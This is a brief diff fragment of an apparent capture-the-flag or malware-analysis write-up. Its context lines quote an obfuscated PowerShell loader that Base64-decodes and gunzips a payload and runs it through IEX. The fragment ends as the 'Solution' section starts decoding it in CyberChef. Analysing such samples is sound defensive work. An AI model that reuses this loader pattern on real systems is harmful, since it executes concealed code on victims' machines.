@@ -17,6 +17,7 @@ $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("H4sIAEFgjl8A/xXMMQrC
 IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();
 ```
 Solution:
+
 Step 1: 
 We grab the encrypted text and use the from base64 in cyberchef.
 After doing this we get:
